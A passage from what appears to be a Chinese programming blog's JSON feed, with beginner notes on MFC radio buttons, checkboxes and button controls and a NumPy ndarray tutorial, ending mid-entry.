            "content_html": "<h1 id=\"单选框件的基本使用\"><a class=\"anchor\" href=\"#单选框件的基本使用\">#</a> 单选框件的基本使用</h1>\n<p>我们先添加两个单选框：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>若是没有选择，我们设置默认为男：</p>\n<p>在对话框初始化的地方添加代码：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 单选框也是按钮 也是 CButton 类</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>CButton<span class=\"token operator\">*</span> pNan <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>CButton<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">GetDlgItem</span><span class=\"token punctuation\">(</span>IDC_RADIO1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pNan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">// BST_CHECKED 选中状态</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  pNan<span class=\"token operator\">-></span><span class=\"token function\">SetCheck</span><span class=\"token punctuation\">(</span>BST_CHECKED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里有个分组的问题，如果有多组单选按钮：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>那么我们只能选择其中的一个。</p>\n<p>这里就要注意了一下两点了。</p>\n<ol>\n<li>要求一组内的单选框按钮控件 ID 必须由小到大排列，中间不能夹杂其他组的单选框按钮。</li>\n<li>若有多组，则组内第一个单选框按钮的 Group 属性为 True，其他为 False。</li>\n</ol>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p><strong>另一种方法选中组内某个单选框按钮：</strong></p>\n<p><code>void CheckRadioButton(int nIDFirstButton, int nIDLastButton,\tint nIDCheckButton);</code></p>\n<p>参数分别是： 组内的第一个单选框按钮 ID 组内的最后一个单选框按钮 ID 要设置选中专状态的单选框 ID 。</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p><strong>获得当前当前选中的单选框按钮控件：</strong></p>\n<p>虽然我们可以先获取控件的指针，然后调用 GetCheck 函数判断：</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>但如果有十多个甚至更多的选项，我们一个一个取判断就很麻烦了。</p>\n<p>所以我们用这个函数   <code>int nCheckId = GetCheckedRadioButton(IDC_RADIO1, IDC_RADIO2);</code></p>\n<p><code>GetCheckedRadioButton</code>   传入第一个单选框的 ID 和最后一个单选框的 ID 这个函数会判断这些 ID 范围内的单选框的选中状态，并且会返回按钮中当前选中的单选按钮的 ID。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<h1 id=\"复选框的基本使用\"><a class=\"anchor\" href=\"#复选框的基本使用\">#</a> 复选框的基本使用</h1>\n<ol>\n<li>勾选复选框控件：</li>\n</ol>\n<p>::SendMessage(::GetDlgItem(m_hWnd, IDC_CHECK1), BM_SETCHECK, BST_CHECKED, 0);<br />\nGetDlgItem(IDC_CHECK1)-&gt;SendMessage(BM_SETCHECK, BST_CHECKED, 0);<br />\nm_Check.SetCheck(BST_CHECKED);</p>\n<p>三种方法任意一种都可以！</p>\n<p>备注：取消勾选的话只需要把  <code>BST_CHECKED</code>  改成  <code>BST_UNCHECKED</code>  就可以了！</p>\n<ol start=\"2\">\n<li>获取复选框的勾选状态：<br />\nUINT nCheckState = ::SendMessage(::GetDlgItem(m_hWnd, IDC_CHECK1), BM_GETCHECK, 0, 0);<br />\nnCheckState = GetDlgItem(IDC_CHECK1)-&gt;SendMessage(BM_GETCHECK, 0, 0);<br />\nnCheckState = m_Check.GetCheck();<br />\n 三种方法任意一种都可以！</li>\n</ol>\n<p>如果返回值 nCheckState 的值为 BST_CHECKED，那么就是勾选状态。如果值为 BST_UNCHECKED，那么就是非勾选状态。</p>\n<p>都是一些简单的设置：</p>\n<p><img data-src=\"image007.png\" alt=\"\" /><br />\n<img data-src=\"image008.png\" alt=\"\" /><br />\n<img data-src=\"image009.png\" alt=\"\" /><br />\n<img data-src=\"image010.png\" alt=\"\" /></p>\n",
            "tags": [
                "单选框",
                "复选框件"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC-01%E6%8C%89%E9%92%AE%E6%8E%A7%E4%BB%B6/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC-01%E6%8C%89%E9%92%AE%E6%8E%A7%E4%BB%B6/",
            "title": "MFC-01按钮控件",
            "date_published": "2022-03-18T11:42:30.000Z",
            "content_html": "<h1 id=\"楔子\"><a class=\"anchor\" href=\"#楔子\">#</a> 楔子</h1>\n<p>之前学习了 win32 的窗口编程，如今想进一步学习一下，C++ 的图形化编程。</p>\n<h1 id=\"创建一个mfc对话框工程\"><a class=\"anchor\" href=\"#创建一个mfc对话框工程\">#</a> 创建一个 MFC 对话框工程</h1>\n<p>这里我遇到了一个问题，用 VS2019 创建 MFC 工程，<strong>对 COM 组件的调用返回了错误 HRESULT E_FAIL</strong> 上网查了些文章，按着方法也照做了，可是还是不行，后来找到了原因，是因为项目名字中有下划线……，为了保险起见，我把放 MFC 代码的文件夹也取消下划线了。</p>\n<p>因为是初学者，暂时先设置成这样：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h1 id=\"button控件\"><a class=\"anchor\" href=\"#button控件\">#</a> button 控件</h1>\n<p>因为之前有 win32 的基础，所以只记下没有学过的一些内容。</p>\n<h2 id=\"禁用按钮\"><a class=\"anchor\" href=\"#禁用按钮\">#</a> 禁用按钮</h2>\n<p>相关函数：  <code>EnableWindow</code></p>\n<p>主要代码如下，不要在意函数名。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMFCCStringDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnBnClickedButton3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加控件通知处理程序代码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// MFC 获取控件句柄</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// 此函数有两个重名的，在全局上有一个，在 MFC 中也有，我们这里调用全局的，加上全局作用域</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// win32 sdk api</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tHWND hButton2 <span class=\"token operator\">=</span> <span class=\"token operator\">::</span><span class=\"token function\">GetDlgItem</span><span class=\"token punctuation\">(</span><span class=\"token function\">GetSafeHwnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> IDC_BTN_Test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hButton2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token operator\">::</span><span class=\"token function\">EnableWindow</span><span class=\"token punctuation\">(</span>hButton2<span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMFCCStringDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnBnClickedButton4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加控件通知处理程序代码</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token comment\">// 这次使用 MFC 的函数</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tCWnd<span class=\"token operator\">*</span> pButtonCWnd <span class=\"token operator\">=</span> <span class=\"token function\">GetDlgItem</span><span class=\"token punctuation\">(</span>IDC_BTN_Test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pButtonCWnd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\tpButtonCWnd<span class=\"token operator\">-></span><span class=\"token function\">EnableWindow</span><span class=\"token punctuation\">(</span>TRUE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token comment\">//::EnableWindow(pButtonCWnd->GetSafeHwnd(), TRUE);</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>点击之后变成了这样：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"绑定控件类型变量\"><a class=\"anchor\" href=\"#绑定控件类型变量\">#</a> 绑定控件类型变量</h2>\n<p>我们想对按钮控件启用或者禁用之前必须先获得按钮控件的窗口句柄，也就是说如果以后要对这个按钮控件进行任何操作，都得先获取他的窗口句柄，之后才能操作，也就是都得调用这句话：HWND hBtn = ::GetDlgItem (m_hWnd, IDC_BTN_1);</p>\n<p>比较麻烦，有什么简单点的办法吗？这就需要了解绑定控件类型变量了。</p>\n<p>选择控件对其点击右键， 选择添加变量，就会出现如下界面：</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>用看控件类型变量来实现上面的禁用操作：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMFCCStringDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnBnClickedButton3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加控件通知处理程序代码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">//// MFC 获取控件句柄</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">//// 此函数有两个重名的，在全局上有一个，在 MFC 中也有，我们这里调用全局的，加上全局作用域</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">//// win32 sdk api</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token comment\">//HWND hButton2 = ::GetDlgItem(GetSafeHwnd(), IDC_BTN_Test);</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">//if (hButton2)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token comment\">//&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">//\t::EnableWindow(hButton2, FALSE);</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">//&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tBTN_Test<span class=\"token punctuation\">.</span><span class=\"token function\">EnableWindow</span><span class=\"token punctuation\">(</span>FALSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMFCCStringDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnBnClickedButton4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加控件通知处理程序代码</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token comment\">//// 这次使用 MFC 的函数</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token comment\">//CWnd* pButtonCWnd = GetDlgItem(IDC_BTN_Test);</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token comment\">//if (pButtonCWnd)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token comment\">//&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token comment\">//\tpButtonCWnd->EnableWindow(TRUE);</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token comment\">//\t//::EnableWindow(pButtonCWnd->GetSafeHwnd(), TRUE);</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token comment\">//&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token comment\">// 有缺省值 默认为 1</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tBTN_Test<span class=\"token punctuation\">.</span><span class=\"token function\">EnableWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"控件的美化\"><a class=\"anchor\" href=\"#控件的美化\">#</a> 控件的美化</h2>\n<p>简单了解一下了。</p>\n<p>先把要设置的按钮行为属性中的 <strong>所有者描述</strong> 改为 TURE，英文是 Owner Draw。</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>因为要自己绘图，直接在网上用现成的了：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29kZXByb2plY3QuY29tL0FydGljbGVzLzUwMzEvTWFraW5nLUNvb2wtQnV0dG9uLXVzaW5nLUltYWdlcw==\">https://www.codeproject.com/Articles/5031/Making-Cool-Button-using-Images</span></p>\n<p>结果如下：</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n",
            "tags": [
                "button"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "url": "https://or0kit.github.io/Programming/Python/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "title": "pandas库学习",
            "date_published": "2021-03-23T11:08:13.000Z",
            "content_html": "<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": []
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "url": "https://or0kit.github.io/Programming/Python/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/",
            "title": "numpy库学习",
            "date_published": "2021-03-23T11:07:40.000Z",
            "content_html": "<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9udW1weS9udW1weS10dXRvcmlhbC5odG1s\">https://www.runoob.com/numpy/numpy-tutorial.html</span></p>\n<h1 id=\"numpy库简介\"><a class=\"anchor\" href=\"#numpy库简介\">#</a> Numpy 库简介</h1>\n<p>NumPy (Numerical Python) 是 Python 语言的一个扩展程序库，支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。</p>\n<p>NumPy 的前身 Numeric 最早是由 Jim Hugunin 与其它协作者共同开发，2005 年，Travis Oliphant 在 Numeric 中结合了另一个同性质的程序库 Numarray 的特色，并加入了其它扩展而开发了 NumPy。NumPy 为开放源代码并且由许多协作者共同维护开发。</p>\n<p>NumPy 是一个运行速度非常快的数学库，主要用于数组计算，包含：</p>\n<ul>\n<li>一个强大的 N 维数组对象 ndarray</li>\n<li>广播功能函数</li>\n<li>整合 C/C++/Fortran 代码的工具</li>\n<li>线性代数、傅里叶变换、随机数生成等功能</li>\n</ul>\n<h1 id=\"numpy-应用\"><a class=\"anchor\" href=\"#numpy-应用\">#</a> NumPy 应用</h1>\n<p>NumPy 通常与 SciPy（Scientific Python）和 Matplotlib（绘图库）一起使用， 这种组合广泛用于替代 MatLab，是一个强大的科学计算环境，有助于我们通过 Python 学习数据科学或者机器学习。</p>\n<p>SciPy 是一个开源的 Python 算法库和数学工具包。</p>\n<p>SciPy 包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。</p>\n<p>Matplotlib 是 Python 编程语言及其数值数学扩展包 NumPy 的可视化操作界面。它为利用通用的图形用户界面工具包，如 Tkinter, wxPython, Qt 或 GTK+ 向应用程序嵌入式绘图提供了应用程序接口（API）。</p>\n<h1 id=\"相关链接\"><a class=\"anchor\" href=\"#相关链接\">#</a> 相关链接</h1>\n<p>NumPy 官网 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5udW1weS5vcmcv\">http://www.numpy.org/</span><br />\nNumPy 源代码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL251bXB5L251bXB5\">https://github.com/numpy/numpy</span></p>\n<h1 id=\"numpy-ndarray对象\"><a class=\"anchor\" href=\"#numpy-ndarray对象\">#</a> Numpy Ndarray 对象</h1>\n<p>NumPy 最重要的一个特点是其 N 维数组对象 ndarray，它是一系列同类型数据的集合，以 0 下标为开始进行集合中元素的索引。</p>\n<p>ndarray 对象是用于存放同类型元素的多维数组。</p>\n<p>ndarray 中的每个元素在内存中都有相同存储大小的区域。</p>\n<p>ndarray 内部由以下内容组成：</p>\n<ul>\n<li>\n<p>一个指向数据（内存或内存映射文件中的一块数据）的指针。</p>\n</li>\n<li>\n<p>数据类型或 dtype，描述在数组中的固定大小值的格子。</p>\n</li>\n<li>\n<p>一个表示数组形状（shape）的元组，表示各维度大小的元组。</p>\n</li>\n<li>\n<p>一个跨度元组（stride），其中的整数指的是为了前进到当前维度下一个元素需要 &quot;跨过&quot; 的字节数。</p>\n</li>\n</ul>\n<h1 id=\"创建ndarray\"><a class=\"anchor\" href=\"#创建ndarray\">#</a> 创建 Ndarray</h1>\n<p>创建一个 ndarray 只需调用 NumPy 的 array 函数即可：<br />\n <code>numpy.array(object, dtype = None, copy = True, order = None, subok = False, ndmin = 0)</code></p>\n<p>参数说明：</p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:right\">名称</td>\n<td style=\"text-align:left\">描述</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">object</td>\n<td style=\"text-align:left\">数组或嵌套的数列</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">dtype</td>\n<td style=\"text-align:left\">数组元素的数据类型，可选</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">copy</td>\n<td style=\"text-align:left\">对象是否需要复制，可选</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">order</td>\n<td style=\"text-align:left\">创建数组的样式，C 为行方向，F 为列方向，A 为任意方向（默认）</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">subok</td>\n<td style=\"text-align:left\">默认返回一个与基类类型一致的数组</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">ndmin</td>\n<td style=\"text-align:left\">指定生成数组的最小维度</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"认识numpy的数组对象ndarray\"><a class=\"anchor\" href=\"#认识numpy的数组对象ndarray\">#</a> 认识 Numpy 的数组对象 Ndarray</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 代码 2-1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np  <span class=\"token comment\"># 导入 NumPy 库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>arr1 <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建一维数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">' 创建的数组为： '</span><span class=\"token punctuation\">,</span> arr1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 创建二维数组</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>arr2 <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的数组为：\\n'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组类型为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">.</span>dtype<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组类型</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组元素个数为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组元素个数</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组每个元素大小为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">.</span>itemsize<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组每个元素大小</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 代码 2-2</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>arr2<span class=\"token punctuation\">.</span>shape <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span>  <span class=\"token comment\"># 重新设置 shape</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'重新设置shape 后的arr2 为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># 代码 2-3</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用arange函数创建的数组为：\\n'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># 代码 2-4</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用linspace函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>linspace<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 代码 2-5</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用logspace函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>logspace<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># 代码 2-6</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用zeros函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 代码 2-7</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用eye函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>eye<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># 代码 2-8</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用diag函数创建的数组为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token 